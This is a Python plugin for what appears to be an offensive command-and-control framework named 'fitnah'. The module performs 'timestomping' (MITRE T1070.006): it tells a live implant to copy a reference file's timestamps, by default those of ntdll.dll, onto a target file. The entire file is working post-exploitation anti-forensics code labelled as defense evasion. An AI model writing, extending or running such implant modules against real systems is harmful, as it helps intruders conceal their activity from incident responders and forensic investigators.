"""defense_evasion/timestomp — copy timestamps from a reference file via implant Timestomp(). MITRE T1070.006"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class Timestomp(BasePlugin):
    NAME        = "timestomp"
    DESCRIPTION = "Copy file timestamps from source to target via NtSetInformationFile (no PowerShell)."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1070.006"
    CATEGORY    = "defense_evasion"
    schema      = ParamSchema().add(
        Param("target", str, required=True,  help="File whose timestamps to modify"),
        Param("source", str, required=False, default=r"C:\Windows\System32\ntdll.dll",
              help="Reference file to copy timestamps from (default: ntdll.dll)"),
    )

    @mitre("T1070.006")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        r = ctx.send("timestomp", {
            "source": params.get("source", r"C:\Windows\System32\ntdll.dll"),
            "target": params["target"],
        })
        if r["status"] != "ok":
            return ModuleResult.err(f"timestomp failed: {r['output']}")
        return ModuleResult.ok(data=r["output"] or "Timestamps stomped")
